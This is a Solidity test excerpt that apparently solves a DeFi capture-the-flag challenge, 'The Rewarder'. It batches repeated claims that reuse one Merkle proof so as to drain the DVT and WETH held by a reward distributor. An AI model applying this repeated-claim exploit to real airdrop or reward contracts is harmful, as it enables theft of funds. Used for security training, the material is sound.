...
contract TheRewarderChallenge is Test {
    ...
    function test_theRewarder() public checkSolvedByPlayer {
        // IERC20 array storing target token addresses
        IERC20[] memory inputTokens = new IERC20[](2);
        inputTokens[0] = IERC20(address(dvt));
        inputTokens[1] = IERC20(address(weth));

        uint256 dvt_amount = 11524763827831882;// Amount of DVT to be claimed per iteration
        uint256 weth_amount = 1171088749244340;// Amount of WETH to be claimed per iteration

        uint256 dvt_remaining = distributor.getRemaining(address(dvt));// Fetch remaining undistributed DVT reward balance
        uint256 weth_remaining = distributor.getRemaining(address(weth));// Fetch remaining undistributed WETH reward balance

        uint256 dvt_count = dvt_remaining / dvt_amount;// Calculate total loop iterations required to drain DVT
        uint256 weth_count = weth_remaining / weth_amount;// Calculate total loop iterations required to drain WETH

        Claim[] memory claims = new Claim[](dvt_count + weth_count);// Allocate array for batch claim payloads

        // Key Optimization: Fetch Merkle proofs outside the loop to optimize gas
        bytes32[] memory dvtProof = merkle.getProof(dvtLeaves, 188);// DVT Merkle proof
        bytes32[] memory wethProof = merkle.getProof(wethLeaves, 188);// WETH Merkle proof

        // Populate array with repeated DVT claims
        ...
        // Populate array with repeated WETH claims
        ...
        // Trigger batch reward claim exploit
        distributor.claimRewards(claims, inputTokens);

        // Sweep all claimed funds to recovery account
